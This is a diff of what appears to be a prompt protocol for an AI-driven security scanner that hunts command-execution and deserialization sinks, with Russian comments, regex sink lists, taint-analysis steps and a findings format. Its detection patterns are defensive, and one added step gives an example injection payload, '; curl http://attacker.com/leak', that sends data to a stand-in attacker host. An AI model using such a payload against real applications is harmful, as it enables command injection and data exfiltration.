@@ -1,65 +1,34 @@
-<DFD_MODELING_V3>
+<DEEP_SCAN_V3>
 @ID: COMMAND_CODE_EXECUTION_SINKS
-@GOAL: IDENTIFY_DANGEROUS_FUNCTIONS_CAPABLE_OF_EXECUTING_ARBITRARY_OS_COMMANDS_OR_CODE
-@PARENT_CONTEXT: entry_points.protocol, privilege_transitions.protocol, security_controls.protocol
+@GOAL: IDENTIFY_DANGEROUS_FUNCTIONS_CAPABLE_OF_EXECUTING_OS_COMMANDS_OR_CODE
+@PARENT_CONTEXT: entry_points.protocol, privilege_transitions.protocol
 
 <GLOBAL_VARS>
-# Список функций-приемников (Sinks) по технологическим стекам
-CODE_EXEC_SINKS: {
-  "NODEJS": "(eval|setTimeout|setInterval|Function|vm\.runInContext|vm\.Script)",
-  "PYTHON": "(eval|exec|execfile|compile|getattr|setattr)",
-  "JAVA": "(ScriptEngine\.eval|ProcessBuilder|Runtime\.getRuntime\(\)\.exec)"
-}
-
 OS_COMMAND_SINKS: {
-  "NODEJS": "(child_process\.(exec|spawn|fork|execSync|spawnSync)|shelljs\.exec)",
   "PYTHON": "(os\.(system|popen|spawn)|subprocess\.(run|call|Popen|check_output))",
-  "PHP": "(system|exec|passthru|shell_exec|popen|proc_open)"
+  "NODEJS": "(child_process\.(exec|spawn|fork)|shelljs\.exec)"
 }
-
-# Паттерны для детекции опасной десериализации (часто ведет к RCE)
-DESERIALIZATION_SINKS: "(unserialize|pickle\.load|yaml\.load|JSON\.parse|marshal\.load)"
+DESERIALIZATION_SINKS: "(unserialize|pickle\.load|yaml\.load|marshal\.load)"
 </GLOBAL_VARS>
 
-<CONTEXT_MAP>
-[EXTERNAL_INPUTS] <- {from: entry_points.protocol, scope: "INGRESS_POINTS"}
-[SECURITY_GATES]  <- {from: security_controls.protocol, scope: "VALIDATION_LOGIC"}
-[TRANSITIONS]     <- {from: privilege_transitions.protocol, scope: "ELEVATION_POINTS"}
-</CONTEXT_MAP>
-
-<ASSERTIONS>
-# Логические инварианты безопасности исполнения
-! ([EXTERNAL_INPUTS] -> [CODE_EXEC_SINKS]) : "BLOCKER: Remote Code Execution (RCE). External input reaches a code execution sink without intermediate sanitization."
-! ([OS_COMMAND_SINKS] && ![SECURITY_GATES]) : "CRITICAL: OS Command Injection. System commands are constructed using raw variables without shell-escape or parameterization."
-! ([DESERIALIZATION_SINKS] -> "Unsigned_Data") : "HIGH: Insecure Deserialization. Untrusted data is deserialized, potentially allowing object injection or RCE."
-? ([TRANSITIONS] -> [OS_COMMAND_SINKS]) : "MEDIUM: Privilege Escalation Risk. A command sink is used during a privilege transition, increasing the impact of a potential injection."
-</ASSERTIONS>
-
 <EXECUTION_PIPELINE>
-1. SINK_INVENTORY_SCAN:
-   - Выполнить поиск всех вызовов функций из [CODE_EXEC_SINKS] и [OS_COMMAND_SINKS].
-   - Идентифицировать контекст вызова (Backend, CLI-tool, Worker).
+1. SINK_INVENTORY_SCAN: Поиск всех вызовов из [OS_COMMAND_SINKS] и [DESERIALIZATION_SINKS].
+2. ARGUMENT_TAINT_ANALYSIS: Если аргумент — переменная, отследить путь до [EXTERNAL_INPUTS].
+3. SHELL_MODE_VERIFY: Если `shell=True` — приоритет BLOCKER.
+4. SCENARIO_GENERATION: Сформировать Payload (например, `; curl http://attacker.com/leak`).
 
-2. ARGUMENT_ORIGIN_ANALYSIS:
-   - Проанализировать аргументы функций. Если аргумент является литералом — риск отсутствует.
-   - Если аргумент является переменной — запустить обратный Taint-анализ до [EXTERNAL_INPUTS].
-
-3. SHELL_INTERPRETATION_CHECK:
-   - Проверить, запускается ли команда через оболочку (`shell: true` в Node.js или `shell=True` в Python). 
-   - Вызовы через оболочку имеют приоритет "CRITICAL" из-за возможности использования метасимволов (`;`, `&&`, `|`).
-
-4. DESERIALIZATION_SINK_AUDIT:
-   - Проверить использование небезопасных методов загрузки (например, `yaml.safe_load()` vs `yaml.load()`).
-   - Сопоставить с [SECURITY_GATES] для проверки наличия подписи или HMAC перед десериализацией.
-
-5. BLAST_RADIUS_ESTIMATION:
-   - Оценить права пользователя, от которого запущен процесс (на основе iac_audit.protocol).
-   - Определить возможность Lateral Movement при успешном срабатывании Sink.
+   - HYBRID_ANALYSIS: Read JSON artifacts (syft.json, grype.json, kics.json) from .security_review/artifacts/raw_tools_output/. Treat these results as 'Hard Evidence'. Perform AI Reachability Analysis to verify if the vulnerable component is reachable from the code. If confirmed, elevate the finding status to BLOCKER.
 </EXECUTION_PIPELINE>
 
 <OUTPUT_SPEC>
-GENERATE_SINK_MAP_REPORT:
-  - SINK_TYPE | FUNCTION_NAME | TAINT_SOURCE | EXECUTION_CONTEXT | SEVERITY
-VISUALIZE: "Image of an attack tree: Root node is 'Remote Code Execution', branches represent different sink types (Eval, System Call, Deserialization)."
+# ФОРМАТ ДЛЯ АВТОМАТИЧЕСКОГО ПАРСИНГА БЭКЕНДОМ
+🚨 FINDING [command_code_execution]:
+FILE: [PATH]
+LINE: [NUM]
+CODE: [SINK_CALL_SNIPPET]
+DESCRIPTION: [Tool_Name] found [Vulnerability_ID]. AI Analysis confirmed that the vulnerable path is active in the current code flow via [Function_Name].
+SCENARIO_OF_ATTACK: An attacker sends a payload containing shell metacharacters (e.g., ;, |, &) to [ENTRY_POINT]. The application executes this as part of a system command, allowing the attacker to run arbitrary code with [USER] privileges.
+@ANALYTICS_DATA: {"domain": "LOGIC_INTEGRITY", "impact": 1.0}
+VISUALIZE: "Image of an attack tree: Root node is 'Remote Code Execution'."
 </OUTPUT_SPEC>
-</DFD_MODELING_V3>
+</DEEP_SCAN_V3>
